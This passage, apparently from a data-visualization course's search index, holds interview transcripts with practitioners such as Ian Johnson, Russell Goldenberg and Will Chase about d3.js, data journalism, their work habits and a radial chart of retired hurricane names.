I think I learned some new things. There's tons of really good tips and tricks as well as the overall process. So I think it's a really good book. Would recommend it! And I'm excited to check it out when it does come out!  Do you guys have a release date for it?</p> <p>Shirley: [00:15:19]</p> <p>Oh, thank you! And thank you so much for all the feedback he gave us. He gave us so much great feedback. Okay. It is supposed to come out early February. I believe the exact date is February 9<sup>th</sup>, 2021, but please don't quote me on the date.</p> <p>Amelia: [00:15:34]</p> <p>I can't wait. Well, thanks so much for coming on. It was really interesting talking about job titles and your process and your background. I think people are going to get a lot out of it.</p> <p>Shirley: [00:15:44]</p> <p>Yeah, thank you so much for having me. This was really fun and I hope we get to do it again. Maybe you can have like a second course and then we'll do it like that.</p> <p>Yeah. Or you can do a course and then I'll come on yours and we can trade off.</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.02/ian-johnson/","title":"Ian Johnson","text":"<p>Ian and I talk about his long history of building up the d3.js community, his day-to-day working at Observable, and the value of breaking projects down into small pieces.</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.02/ian-johnson/#links","title":"Links","text":"<p>@enjalot</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.02/ian-johnson/#transcript","title":"Transcript","text":"<p>Amelia: [00:00:00]</p> <p>Today we have Ian Johnson on. He's a data visualization developer at Observable, and he's been a big part of the d3.js community for a while now. So Ian, if you want to introduce yourself and talk about your history with the d3 community...</p> <p>Ian: [00:00:17]</p> <p>Sure. Yeah. I mean, it's actually  been almost 10 years.... well, d3 has been out for, will have been out for 10 years in February, 2021. And I sort of stumbled onto it by joining a startup in 2011, where they were like, \"Hey, we want to build some visualization tools. This new library came out. Can you help us? Let's figure it out and build stuff with it.\"</p> <p>So I got pretty lucky there, in terms of, it's turned out to be a great library and a great tool to use, to make visualizations all that time. I think, though, I remember back then the main way to learn it was by asking questions on the mailing list. And, you know, I spent a good six months banging my head against the desk, trying to understand the enter, update, exit pattern and we actually started a meetup because it was so hard to learn.</p> <p>We started at the SF Bay area meetup as like 10 people getting together for coffee to talk about d3 and so I've been part of that for a long time as well, which has been a great way to see what other people are making and learn from other folks.</p> <p>Amelia: [00:01:43]</p> <p>I love that. I went to the d3 unconf conference, or non-conference, last year.  How have you seen the community grow over the past decade? Because, I feel like, the 10 people in a coffee shop to the conference last year, it's really grown a lot.</p> <p>Ian: [00:02:11]</p> <p>Yeah, yeah, the community is huge. I mean, d3 is one of the most like, starred, or whatever, Github projects / open source projects out there, but the community  of people sharing and making work has grown a lot over that time.</p> <p>I think it's really interesting to see. So the unconference came about as a recognition that there are some big data viz conferences, but what was really nice about the meetups was chatting with everybody and the one-on-one conversations that we did get at the nice conferences, you know, between the sessions you get to have spirited discussions about how people did things and that kind of stuff. So we wanted to say, can we have an event where that's all we do. And we also purposely limited to a hundred people. So, we've done five of them now, last year was the most recent, and we always keep it to that size to where you don't feel overwhelmed.</p> <p>You can't quite meet every single person, but you feel like you can, you know, talk to folks. You can always reach someone you want to talk to. Yeah. So I think that, you know, one thing I've also appreciated by the d3 community, both the in-person meetups, the conferences, and online is how humble and welcoming people are.</p> <p>I think there's something about d3 where it combines design, software engineering, data analytics, and data science, all of these disciplines that it's hard enough to be an expert at any one of those to expect to be an expert at all of them is pretty much impossible. I mean, there's people like you that make amazing things, right? But you also know that like you've learned a lot from folks in the community and you partner with people, I think right? And there's... it's just impossible to know all the things about all the things. Nobody comes in with a better-than-thou attitude.</p> <p>And I think that that's always been really encouraging for me as someone who, at this time after doing it for so long, there's a lot of d3 stuff I know, but there's way more d3 stuff that I don't know. I'm still constantly learning from you, from folks like Shirley, and Nadieh, right? Just people making beautiful, impactful visualizations, always combining new techniques and pulling on stuff from these different disciplines. It never you never stop learning. So while that could be imposing in one way, the other, to me, is inspiring because there is no ceiling.</p> <p>Amelia: [00:05:15]</p> <p>I think you hit the nail on the head. It's just such a great welcoming community with such a diverse set of people. Like, I think you have a CS background, I have like a psychology neuro background, there's people who are from research backgrounds, people who are from... what's something weird? What's the weirdest background you've heard?</p> <p>Ian: [00:05:40]</p> <p>The weirdest background? I know there's people that are school teachers. I've noticed that a lot of designers I've met that I ended up doing data viz projects have a different background from like design, right? So like anthropology... it's really cool. Like people come in basically wanting to express some data, like some patterns or something they know about, right? But in this new way, using programming to be able to automate or make it interactive or, yeah, bringing a different perspective in, right?</p> <p>And so you get so many different perspectives. It's really cool.</p> <p>Amelia: [00:06:29]</p> <p>Yep. And we're always learning from each other. And I think that's so great. Kind of related, you've been doing data visualization for almost a decade now, or maybe a decade now. What is the strongest motivation for you to keep visualizing data? What's the best part about it?</p> <p>Ian: [00:06:52]</p> <p>The strongest  motivation for me is trying to gain a better understanding of how things work. I feel like data is the most direct way to see what's going on in a complex system. A lot of the work I've done over the years has been in trying to understand complex systems. So it could be large-scale computing, could be elections or COVID, that kind of stuff. Anything where there's a lot of things going on, it's really complicated, a lot of things to consider, but we also have good data on it, I feel is a prime candidate for applying visualization to.</p> <p>And the more I do it and the more I see people do it, the more ideas I get for ways that it could be done better. And so to me that continues to motivate me.</p> <p>Amelia: [00:08:00]</p> <p>Yeah. It seems that as a design challenge, there're enough  constraints that there's just always a constrained space to work in. Like, if you're working with a specific dataset, it's not just design a button or design a date picker, which I guess has its own constraints, but each data set you work with is going to have its own constraints, especially if they're really complicated, like the election data sets. I feel like every election we have new new data viz from all the different news sites, which is fun. And we never feel like we've solved it, right? It's always kind of evolving, which is a fun journey.</p> <p>Ian: [00:08:45]</p> <p>Absolutely. And I just want to add to that I feel that data viz is also about communicating, right?</p> <p>So you're trying to express something that you see, right? Like maybe it's a pattern in that system, or you're trying to... first, you might be trying to understand as the creator of the viz, trying to work with that data and understand what's happening. But once you've learned something about what's happening, trying to communicate that to other people is another challenge.</p> <p>And you could write a paragraph, you could write an essay, or you can make a static visualization, you could make an animated or an interactive visualization. And so to me, there's just so much opportunity to figure out how to express that understanding. And it takes a lot of creativity to do it well, or do better each time.</p> <p>Amelia: [00:09:45]</p> <p>Yeah, totally.</p> <p>So you work at Observable. What does your day-to-day look like there?</p> <p>Ian: [00:09:53]</p> <p>My day-to-day Observable is interesting. Most days I am making some kind of notebook, So, whether I'm helping document various aspects of d3 or make examples of features for Observable or... I'm also doing this live stream where we try to challenge ourselves in various ways.</p> <p>It's interesting because, for me, that's the best way to move forward: to make small things often. I feel like when I've been able to do that in the past is how my skills have grown the most and the fastest. And so at Observable, we're trying to build a tool that enables that, and helps you think with your data.</p> <p>So I'm just happy that I get to do that every day. Like, try to make a small pieces, put those pieces together, fork other people's examples or datasets, push those forward. Yeah. That's a good portion. I guess the I'm also helping part of Observable supporting the d3 community.</p> <p>So I'm helping organize, it's not an Observable thing, but, now that we don't do in-person meetups or in-person conferences, trying to help advance the d3 community online. And so that might be doing more events online, as well as, improve the the way that you access and learn about d3 online.</p> <p>Amelia: [00:11:47]</p> <p>Yeah. You love organizing d3 things.</p> <p>Ian: [00:11:55]</p> <p>Yeah. From my perspective, the more cool viz I get to see, the happier I am. And there are a lot of ways I feel that you can make it easier for people to do something. Either make it easier for them to share it, easier for them to learn, then they'll get further along in their journey and share, and be able to share their more unique perspective, right? I feel like when you're starting out, it's a little harder because you have to figure out how this stuff works and you may feel like, \"Oh, I'm doing something for the first time\" for you, but you've seen people making like really amazing things out there and you want to get there. So just accelerating that as, as much as possible is definitely motivational for me.</p> <p>Amelia: [00:12:47]</p> <p>Yeah. I love seeing Observable examples because, first of all, the code is all there.  So if you want to dissect it and figure out how it works, all you have to do is open the link and kind of look at how the different pens are put together. And then the remix factor is really fun where you're like, \"I want to take this person's legends and then this map and kind of put them together.\"</p> <p>And it's just really easy to work on little parts and then combine them together. which I find really valuable because otherwise you're like, \"Oh no, I have to make this whole visualization.\" Like I want to do this big thing. And then you're sitting there and you're like, \"This is going to be a lot of work\", but it's nice to have not a blank sheet of paper to then edit.</p> <p>Ian:</p> <p>Yeah. And to sort of add to that a little bit, because I a hundred percent agree. You know, I've found many times in like doing my day job type visualization work. especially in the past, like working at big companies, it's like, you're building a code base. You have all these like ways that you do it in that code base or in that project. But ,let's say you see something somebody makes and you're like, that's a good idea. I would love to have that technique. But for my data in my project, what I've found over time is that, you know, it can be tempting to try to copy paste. Let's say, you know, often this happens with a d3 example. You want to copy paste that example, bring it into your environment and make it work. But in fact, I feel it can be much more effective to understand what that technique is and what it's doing in, in that context. And so when you go to do it in your project, you're not trying to fit a bunch of things somebody else decided into how you decided to do things. You're just like, okay. Like, I want to be able to do a crazy SVG gradient, based on the data and this, you know, layer of my thing.  There are so many technical moving parts, just in the example, that if you can isolate to, like, I tweaked it there and I played with it and I like how that works. Let me just take that little piece and bring it into my bigger projects. I found that to be really valuable, to be able to do that, which is kind of newer with Observable.</p> <p>Amelia:</p> <p>Yeah. I really like that. I think something at least us d3 old-timers are familiar with is: a lot of us learned by copying and pasting entire code snippets for the whole chart. And then, you might not even understand all of it, but it's in your project and then you have to maintain it and you don't exactly understand how everything works. Iin the course, I kind of split it up into... I think there's a seven step process of get the data, create your scales, create the wrapper, that kind of thing, to like kind of break it up into different parts.</p> <p>So I think anything where you're not like here's the chart code, look at it. But instead you have these pens where you're like... this variable is created this way. I think it can be really helpful, especially when you're first starting out.</p> <p>Ian: [00:16:19]</p> <p>Yeah, I really liked that because looking for me also. I've given a bunch of workshops in the past and talked to a lot of people at meetups, and I think it's really helpful when folks start to look at it more as a process rather than a single output.</p> <p>So it was like the examples, or even, you know, polished visualizations that people make. It makes it, it can make it feel like, \"Oh, that's a thing. I want that thing.\" Rather than looking at it more like, \"Oh there are a bunch of different processes, a bunch of pieces to this process.\" And I can learn a new data processing technique, or I can learn about a new utility function that makes it easier to do the data part or getting the data part. And that's different from like a new layout or a new, you know, SVG technique or something. And so when you can see that and you can break things down, you just end up a lot less confused when something small changes, but everything disappears or breaks or whatever. Right. But it can definitely happen.</p> <p>Amelia: [00:17:30]</p> <p>Yeah. Way too often.</p> <p>I think this is really great. I love these tips for breaking things down. Is there anything else that you think would be really helpful for someone just starting out with d3 to know either about the library or the community?</p> <p>Ian: [00:17:53]</p> <p>Sure. D3 has a lot of stuff in it, there's a lot of modules, a lot of functions. I mean, you've made an excellent visualization and tutorial to go with it. So I try to always reassure people that you don't have to know all of it at once.</p> <p>You don't have to know even a good fraction of it, to have it help you. And I tend to just encourage people to do smaller projects and examples to start with than they even think they should. Like, try to figure out what the smallest thing is that you can make progress on, because, especially starting out, you can easily balloon your scope and get frustrated or stuck.</p> <p>And, even today, even after doing this for yeah, pretty much 10 years,. I get stuck and I ask myself, \"How can I do like a smaller step? What is a way I could break this down and just tackle like a smaller piece?\"</p> <p>Amelia: [00:19:02]</p> <p>Awesome. Such great advice.</p> <p>Thanks so much for taking the time today.</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.03/russell-goldenberg/","title":"Russell Goldenberg","text":""},{"location":"datav/codes/code/course-full/module_08/lesson_08.03/russell-goldenberg/#links","title":"Links","text":"<p>The Pudding website @codenberg</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.03/russell-goldenberg/#transcript","title":"Transcript","text":"<p>Amelia: [00:00:00]</p> <p>So today we're talking to Russell Goldenberg, he's a Senior Journalist Engineer with me at The Pudding, creating data-driven essays. If you haven't heard of The Pudding, you should definitely check them out at pudding.cool. We make essays with data viz on really interesting topics. Yeah, I'd love to hear a little bit about how you got into the field, Russell.</p> <p>Russell: [00:00:26]</p> <p>I'll give you a medium version of the story because I can talk too long sometimes, but basically my journey was I started out in computer science, so kind of a very traditional Comp Sci track in undergrad. Decided that it was a little bit too technical and conceptual for me in a lot of ways, once I got to the more advanced concepts. I happened to be taking some classes in visual arts with some more kind of programming explorations and stumbled upon the programming language Processing when it was in its alpha phase. That kind of keyed me into this other side of programming and doing more visually driven things and creative things. And I was much more into that. So that kind of changed my career trajectory into this field of... I called it like creative coding or like computational art. So I was very much following in the footsteps of people like Casey Reas, and other people doing artwork and installation work with computer programming. That landed me at a job at the Engagement Lab at Emerson college, where I was doing a mixture of front-end game development for civic engagement. And also doing, basically, these games where we create them for communities and about social issues, but then we get a lot of data from it. And so that's when I started actually playing around with presenting that data, having like no background in data visualization. So I was still kind of applying this visual art-way of looking at data. And then, really, I didn't get into the true field of data visualization or data journalism until I went to Open Viz Conf and I saw a reporter from the Boston Globe, Gabriel Florit. He spoke about basically how hard it was to do data viz on mobile, and it was a really interesting talk because realized this whole other challenge space of presenting information. So, yeah, I guess that's when I officially entered into data journalism and visualization. I applied for a job at the globe after seeing that. And that's where it began for me. So it was kind of a meandering path, just like that story just felt.</p> <p>Amelia: [00:02:52]</p> <p>Oh, that's interesting. I'd like to hear the long version, but, that's definitely an interesting path. How do you think your day-to-day is different than if you had kept on with the typical Computer Science career path?</p> <p>Russell: [00:03:13]</p> <p>I feel like I much more likely would have ended up in like a software development firm or shop. I didn't even take any classes related to web development. And my Computer Science track is very much like a... there's like one elective about it. So it wasn't even on my mind of doing anything on the web. And again, graphical programming was not something that was big in the undergraduate courses during the time, I feel like it's very different now. The landscape of opportunity in the college world and obviously any type of online learning. So I felt like, yeah, I think the path was really narrow, so I've probably wouldn't have ended up doing anything remotely similar to what I'm doing now.</p> <p>Amelia: [00:03:57]</p> <p>And what does your day-to-day look like? Like how much do you spend coding or, doing art-like things.</p> <p>Russell: [00:04:05]</p> <p>I'd say about half my day is spent actually programming. I spend a fair bit of time just doing a lot of research and like around... so as you mentioned, we tell like all sorts of data-driven stories at The Pudding. The one I'm working on now, I'm looking at the usage of the word \"Oreo\" in crossword puzzles and why it's so common and kind of contextualizing that because  there's a big corpus of crossword puzzle data that I've been playing with. So a lot of it is just kind of really steeping myself in this domain that I have no expertise in. I'm a very immature crossword puzzle player, but I don't know a lot about crossword puzzle construction. So a lot of it is just doing background research, sometimes, reaching out to experts and interviewing them. And then, yeah, the other half is doing a lot of programming, putting together mock ups, writing the narrative for stories, and kind of, it's just a whole hodgepodge of kind of creative madness, I guess. I like to think that I could spend more than half of my time coding, but it ends up being a lot of obvious stuff than just coding.</p> <p>Amelia: [00:05:16]</p> <p>Yeah. Half the time, that's a lot, though!</p> <p>Russell: [00:05:19]</p> <p>Who knows if that's accurate.</p> <p>Amelia: [00:05:21]</p> <p>We should all do time tracking. One thing I think a lot of people run into that's hard when they start doing data viz is... if you get this new dataset, it's going to be in this field that you know nothing about. and you're going to have to really quickly learn about: the context and the field and everything that has to do with that data set, like crossword symbols. Do you have any tricks for doing that? And you usually want to do it quickly because you don't want to spend too much time just doing that research.</p> <p>Russell: [00:05:58]</p> <p>Yeah. I think one of my self-pointed rules is: do it before I really get too far into the data, because I feel like once you start playing with data or even exploring it, not even visualizing it, you start to have assumptions about... and things that, you're like... \"Okay, I now know what this thing is about.\" but like you, might've kind of conceived it wrong all along if you didn't understand why that was the case. So I like to try to understand the context of the data before I even jump into it too much. I guess that's one thing. I feel like another is... I definitely will pause whenever I've noticed anything that's slightly amiss, so when I was doing this Oreo thing, I was like, \"Oh cool! The first time they used Oreo as a brand was in 1993, even though we had data going back to the forties.\" So, pretty much, never accepting something, and figuring out why that's the case rather than just accepting it and moving on. I think just constantly questioning what you see because I very suddenly... and that's the only, just like talking about the context of understanding of the data set. I feel like lots of times, more often than not, the thing I'll find is actually an issue with how the data it was collected or put together. So I think just not having... not trusting the data you see, either, is probably the biggest thing for me, too.</p> <p>Amelia: [00:07:23]</p> <p>Hmm. Yeah. Very skeptical mindset.</p> <p>Russell: [00:07:26]</p> <p>Be very skeptical or yes, be curious of why it's like that and not just \"Oh, cool. That's what it says.\"</p> <p>Amelia: [00:07:33]</p> <p>Haha. \"Oh, weird. Okay.\" Yeah, that's awesome. And then what usually comes next in your process? So... you look at the data, you understand some background, you kind of mine through it for anomalies or things that are interesting.</p> <p>Russell: [00:07:53]</p> <p>For me, I'm very visual. So I actually get to pencil on paper sketching really quickly. Usually, I'll start thinking of really interesting ways to present it that are not necessarily even feasible with the data. I just like to get all the ideas down on paper, because I think, when they're in my head, they can seem too good to be true until I started sketching them out. I kind of have to come to the.... answer the hard questions like, \"Oh wait, can I even do this thing that I'm sketching out?\" So I feel like for me, sketching a bunch of ideas in a really quick format is really helpful for me. So that's definitely something I do pretty early on in the process.</p> <p>Amelia: [00:08:35]</p> <p>Yeah. I don't sketch much or, I don't ever feel like sketching, but then once I do, it's just really freeing because you can sketch anything, you know? Whereas if you're, like iterating in code, I'm a really lazy developer, so I'm just going to do what's easy and it's not necessarily going to be the best visual.</p> <p>Russell: [00:09:01]</p> <p>Yeah, I think you definitely can let your imagination run much more wild when you can just spend 15 seconds sketching something, rather than like, let me try to build this all framework up and then realize, \"Oops\", the data doesn't quite work or this isn't necessarily the best thing.</p> <p>Amelia: [00:09:17]</p> <p>Yeah. Yeah. Which is going to be really frustrating. okay, so you sketch and then, do you go straight to the code?</p> <p>Russell: [00:09:29]</p> <p>Most of the time, yes. I don't like seeing high fidelity stuff. I like to let it kind of be a little more emergent. It's very rare that the thing I set out to build is the thing that I end up building, when it's all said and done. So I find bringing the iterative process early on in my production phase much better than coming up with like a picture-perfect mock-up. Cause then also I just feel like I'm beholden to it. If there's this high fidelity mock-up, then I'm like, \"Oh, this is what I have to make.\" Especially if I'm working with somebody other than just myself. If I'm working with a collaborator or a client, I don't like to... it's hard to set up that expectation. And then as you iterate, you're like, \"Oh, we don't actually want to go over here\", but they're really expecting that thing. So I definitely prefer to just iterate in the code and see what happens and just make adjustments along the way. So maybe not the... it is definitely not the most efficient way, but I find it yields the results I'm most proud of.</p> <p>Amelia: [00:10:40]</p> <p>Right. You have a meandering code path or project path, much like you have a meandering career path.</p> <p>Russell: [00:10:47]</p> <p>Yes. That they follow. Yeah. They parallel each other, I guess. I don't like doing things too strict and narrow, I guess.</p> <p>Amelia: [00:10:54]</p> <p>Haha. It's just a personality trait at this point.</p> <p>Russell: [00:10:58]</p> <p>Haha. It has nothing to with coding, it's about my personality.</p> <p>Amelia: [00:11:03]</p> <p>Speaking of coding, do you have any tips for people who are just getting started out with d3, which can be notoriously difficult to wrap your head around?</p> <p>Russell: [00:11:13]</p> <p>Yeah. One tip is: look at more than one source. So, pretty much everything I learned in d3 came from looking at other people's code. I feel like, once you get the fundamentals and you understand how to read the language, then you can actually start looking at bigger pieces. Like, \"Oh, how did someone actually put these two different concepts together?\" Or, kind of, looking beyond the basics. And I think looking at other people's code is really great because it shows you the different things you can do with it. But also it can be terrifying because, like personalities, everyone has very different coding styles and just ways of structuring it and thinking about solving a problem. So, d3 is nice because it's super flexible. It's very low level. But that means there's like eight different ways you can solve one problem. So I find the best thing to do is actually just try to look at a few different ways that multiple people have solved the problem, because some might speak to me more or some might be organized better. So I think that's a really important thing is: don't just look at the first source of the thing you looked at, and that's like the truth and the way to do it, because I think there's always a few different avenues.</p> <p>Amelia: [00:12:33]</p> <p>Yeah. I like that. And it kind of goes back to your skeptical point of like, don't just look at one source and copy it.  Don't just take this course and copy the code that we built. Instead, stay curious about, \"why are we doing this? Why would it be done this way? What other ways are people doing it?\"</p> <p>Russell: [00:12:53]</p> <p>Exactly. Yeah. I guess I have a little trust issues with data and other people's code.</p> <p>Amelia: [00:12:58]</p> <p>Haha, I think they're valid. My last question that I wanted to ask you is: what is your biggest motivation? Like what do you love the most about this kind of work, that keeps you going?</p> <p>Russell: [00:13:13]</p> <p>That's a great question. I feel like I have a few motivations because I feel like seeing... it's not maybe a competitive thing, but just seeing that the field is still kind of emerging and seeing how people tackle the problem of, you know, data visualization is taking data and making people try to understand it visually. I think it's one of these things where there's the simple way to do it, which people understand, but then there's like, how do you tell something that's the more complicated, nuanced ways of getting people to not just understand what's in the data, but really feel it and like kind of internalize it? And I feel like that's the thing that I see a lot of experimentation with in the field and seeing how other people like are constantly pushing that envelope and trying out new things keeps me motivated because I'm like, \"Okay, we haven't solved all the problems, or seen everything yet.\" So  still reasons to be creative with it and try new things out. That's it in... not in a nutshell, but seeing what other people are seeing that other people are still kind of experimenting keeps me motivated.</p> <p>Amelia: [00:14:29]</p> <p>Yeah. Yeah. Same I really like that. Thanks so much for coming on today. Really enjoyed talking and, talking about how skeptical and meandering your approach to things is.</p> <p>Russell: [00:14:43]</p> <p>Thank you for having me.</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.04/will-chase/","title":"Will Chase","text":""},{"location":"datav/codes/code/course-full/module_08/lesson_08.04/will-chase/#links","title":"Links","text":"<p>Making \u2018The Retired\u2019 @W_R_Chase</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.04/will-chase/#transcript","title":"Transcript","text":"<p>Amelia: [00:00:00]</p> <p>Today we're going to talk to Will Chase. I'm really excited about this interview! If you want to give a really quick intro to who you are and, maybe how you got into the data viz field, I think that'd be great.</p> <p>Will: [00:00:12]</p> <p>Yeah, thanks a lot. so I am a data viz designer, a little bit of everything. So I do, essentially, a lot of design, UX, product design, also data visualization development. Currently I work at Fidelity where I do the intersection of a lot of these things. More on the, sort of, product design side of things, but I'm also doing product design on data visualization. So it incorporates a lot of that. And then I freelance part time doing more creative work, more journalistic focused work. So visual storytelling, web design, data visualization development, and all those related things. How I got into this field is, probably like most people, pretty unique. I think a lot of people who got into this field came from sort of non-traditional backgrounds, since it's a fairly new field. So I started out in academia. I was in Biology for a while. I did Plant Biology and Microbiology. Eventually I sort of started transitioning to Computational Biology and that got me into coding. So I started doing more like data analytics, data science kind of stuff. And then I realized through that, that visualization was actually what I really enjoyed. So then I spent a couple of years doing visualization, sort of, working on my design shops, learning about things like typography and color while I was teaching myself to code. I coded in our first. And then nowadays I do most of my coding was JavaScript. Although I still do all my data analysis and a lot of static visualizations with R. I just recently have gotten this job. So I've been at Fidelity for about a year and I've been freelancing, to various degrees, for a couple of years.</p> <p>Amelia: [00:02:18]</p> <p>Oh man. So I think you started pretty recently, right? And I feel like I've seen you on Twitter and you're pretty public about your learning process, right? Do you... you have this whole learn in public mantra of trying and posting about it?</p> <p>Will: [00:02:38]</p> <p>Yeah. I mean, there's a couple aspects of it. So I think, for one, it's a great way to promote yourself, right? So a lot of traction I've got, like clients I've gotten, people I've met, opportunities I've gotten have been because I do post a lot of my work publicly. Both posting code and also tutorials and blog posts. Recently I've been streaming some of my work, making videos. and you know, that does bring a lot of attention from all kinds of avenues. And so, you know, on the one hand, it's definitely good. Like if you're learning, you're also building your publicity at the same time. But the other side of it, I guess I would have, that wasn't necessarily my main motivation for doing it. It was more that, I'm completely self-taught and so, when you're self-taught you rely completely on all these materials that people have produced, usually for free. So, when I was learning, it was all like blog posts or free books that people had made available, video courses, tutorials. And I still learn like that. And so, you know, I did feel sort of like it was a responsibility, not necessarily a requirement, but I felt like I should be giving back, and sort of doing the same thing so that people ould  continue to learn from whatever I produced.</p> <p>Amelia: [00:04:03]</p> <p>Yeah, I totally agree. I had a very similar, I don't know, reaction where I'm also self-taught and there's so much good stuff online for learning how to code. And that's a lot of the reason why I put posts now is it's kind of like pay it forward. Like a lot of people helped me. Yeah.</p> <p>Will: [00:04:25]</p> <p>And it wasn't like that. I mean, you know, like this is a fairly recent development, right. I think like only within the past, I dunno, 10 years probably has there become such open access to stuff and enough diversity  and enough quality content that it is... I don't want to say easy to teach yourself, but you know, certainly easier than it used to be.</p> <p>Amelia: [00:04:47]</p> <p>Yeah, I heard someone on a blog on a podcast recently talking about the difference between teaching yourself and going to a coding boot camp where you can teach yourself because there's so many good resources online, but the hard part is when you have a very specific problem that you can't Google, you kind of just want an answer, which can be really hard. But then like just developing those skills of knowing how to Google for things and how to evolve are so important.</p> <p>Will: [00:05:18]</p> <p>Definitely.</p> <p>Amelia: [00:05:20]</p> <p>You freelance and you also do data viz at Fidelity. How are those two types of projects different?</p> <p>Will: [00:05:31]</p> <p>They're extremely different. So, my work at Fidelity is, you know, like enjoyable, but it's definitely more of like a pay the bills kind of job. It's not something where I'm able to exercise a ton of creativity, just because, you know, it's a large organization, we have a lot of important stakeholders and, you know, the subject matter is more like in the business world, people are much more interested in like, what's the insight in terms of, you know, like, what's the impact of this visualization? What's the like net result of, you know, how is this going to change the company's bottom line? And so, it's usually much more about getting across an insight and that usually happens through fairly simple charts presented in a way that's easy to comprehend. So I basically take all the pent up creativity that I have and exercise that in my freelance job where I don't do any of that kind of stuff. So, in most of my freelancing or personal projects, you know, it's not always paid work a lot of times, these are personal projects as well, I do things where it's much more visual journalism focused, much more like, entirely custom charts, sort of experimental things. Things are a little bit off the wall sometimes. I'm usually trying something new all the time and incorporating new stuff that I've learned, and doing things that either fall pretty squarely within rhe visual journalism side or tend to sort of blur the line between like data art and data visualization.</p> <p>Amelia: [00:07:13]</p> <p>Yeah, that makes a lot of sense. I find that... I used to work on a product at a dashboard company, and a lot of what you're doing is... it's data viz, but it's like bar charts or line charts. So, It's really nice to have projects where you can kind of just go crazy. especially if you're building those skills at work and then you can kind of scratch an itch on the side. And I always found that any side projects I do on the side, I'd end up using those skills in my day to day work. That's really nice.</p> <p>Will: [00:07:54]</p> <p>Yeah, for sure.</p> <p>Amelia: [00:07:57]</p> <p>Let's walk through one of the projects you did recently, if there are any specific ones that you kind of want to talk through. From the brief all the way to the final product.</p> <p>Will: [00:08:11]</p> <p>Let's see, Do you want me to like share my screen and walk through something?</p> <p>Amelia: [00:08:18]</p> <p>Yeah, I think that'd be great if you have anything. Otherwise I can share a link after.</p> <p>Will: [00:08:22]</p> <p>No, definitely. Let me pull up my most recent project. So this is, a project that I did sort of actually it's been going on for like a year, because I started collecting the data, back in like October or September of 2019. But I didn't really begin building this project until the Spring of 2020. So this is a project about retired hurricanes. So I think the story of how this started was that, one night I was like, just randomly got curious about how hurricanes were named, I think, cause we had like a big hurricane season that year. So I was looking up like how hurricanes get their names, and then took me to a Wikipedia page where I found out, which I sort of knew, but like I found out that, the names are using lists, in alphabetical order. And then they repeat every six years. So there's like six lists and then the list recycles. For example, this is the list that was used for 2018 and they go through all these names. And then, these are the other lists, but this 2018 lists will repeat again in 2024. When I was on that Wikipedia page, I saw something that was like retired hurricanes and it explains like anytime there's a storm that's like particularly damaging or particularly deadly, that name is often retired, out of respect for the victims. And so in 2018, for example, they retired Florence and Michael, and then those are replaced with a new name. And the next time that list is recycled. And on this Wikipedia page, there was a link to a sub page that was a list of all retired hurricane names. So I went there and it was basically like a giant data dump. Someone had gone through and collected all kinds of data on all these storms, like wind speed and category number of deaths, amount of damage, all that stuff. So I immediately got this idea to sort of, to visualize, the history of all of these retired hurricane names and do a story about this because it's sort of, you know, it's a self-selected list essentially of like all the worst hurricanes in our history. So I ended up making this story. The primary visual is this circular chart. So, this visualizes each one of the storms going from the 1950s up to 2018, and each of these names is one of the retired, hurricanes. Let me pull up the legend so I can sort of walk through that first. So each of these sort of arms that's going out from the middle has the destructiveness measured here. So the length of this line is the damage caused by the storm. And then the size of this bubble at the end is the number of deaths. The inner circle, with these diamonds, is actually showing the previous occurrences of that name. So I mentioned like the lists keep recycling until the name gets retired. So this is the year that like the main got retired, but, you know, before that it might've been used like a few times, you know, maybe only once or twice, and this is filled or unfilled as whether it made landfall. {Then at the end with these little diamonds around the corner or around the end of the edge circle, it represents the category of the hurricane wherever it hit. So initially I had just planned to do the overall category of the hurricane, just as like a colored dot or something, but then it occurred to me that hurricanes often hit multiple locations and that the peak category of a hurricane might not occur when it actually makes landfall. It might occur like out in the middle of the ocean. And so it's not really an accurate way to represent it. So I went through and recorded in four different locations } {\\cf3  () } Eastern seaboard, Gulf coast, Caribbean, or Central America) what the peak category was when the storm made landfall in that area, or if it didn't. and so I knew from the beginning that I wanted to make a circular visualization, like a big radial visualization, partially because, the visual metaphor here was, you know, like hurricanes obviously have this shape with a little eye in the center. And so the idea of a radial visualization kind of mirrors that shape, but the primary challenge was that normally radio visualizations like this work well in print, because you can, you know, like pick it up, bring it closer to yourself and like turn the page to, you know, see all the way around the edge. And my experience with them on the web was that, most of the times people just kind of punked this issue, right? They're like, okay, it'll just be an SVG and you can like zoom in and pan around if you want. But. It's never really good to read. Like it's always kind of annoying to try to read them. So yeah. You're tilting your head around or you're like, I hate zooming on things and panning it's always like weird. So, my main goal with this, one of my main goals was to make one that was web native and worked well and was easy to read. So I came up with this idea of zooming in. and then this enlarges all of these, and then you can use your scroll wheel to turn the whole visualization, so that you can sort of mimic that idea of like picking it up and turning it, or you can use your keyboard buttons.</p> <p>Amelia: [00:14:26]</p> <p>That's great!</p> <p>Will: [00:14:27]</p> <p>The other thing is that I wanted this to be responsive and work well on any screen size. So, if I resize this, it works well. it also works on mobile. So yeah, that was one of the primary things I wanted to do with this. And then there's a little bit of other material at the end. some more stuff about retired hurricanes. If you want to read the making of blog post, that is on my blog where I go into more excruciating detail about all the data, all the UX, the visual design, the typography, the colors, everything like that. I did end up pitching this story to Scientific American and it was published in their August, 2020 issue. So, this was actually my first piece that appeared in print. That was pretty cool, especially since I always thought it would work best in print, but I think the online version I really enjoy just because of the functionality of the zooming and turning and stuff. I think it's really fun.</p> <p>Amelia: [00:15:37]</p> <p>Yeah. I love this. And, we'll have the links to both this and the making a blog post, which people can read in excruciating detail. And I love your zoom-in interaction because it's such a great example of troubleshooting with data viz. I think it's a really cool field where, we're still establishing, you know, how to do things, especially how to do things on the web. There's so much space for stuff like this. Where it's like, \"Hey, what we usually do isn't really working for me. Figure out a way to fix it.\"</p> <p>Will: [00:16:13</p> <p>Yeah, yeah, exactly. That was my thought.</p> <p>Amelia: [00:16:15]</p> <p>Are there any other highlights that you want to do for, the process? Was this circular layout your first instinct? Were you like, I know exactly what I'm going to do?</p> <p>Will: [00:16:31]</p> <p>Yeah, it was... so I do talk about this a little bit in the blog post, but I had... it sort of started even more like a hurricane. So the initial idea, it was always going to be a circular layout. But in the initial layout, I actually had those, you know, all those little arms coming out were curved so that it looked like a vortex. And I sort of started like, prototyping that I started something on Observable and, you know, basically 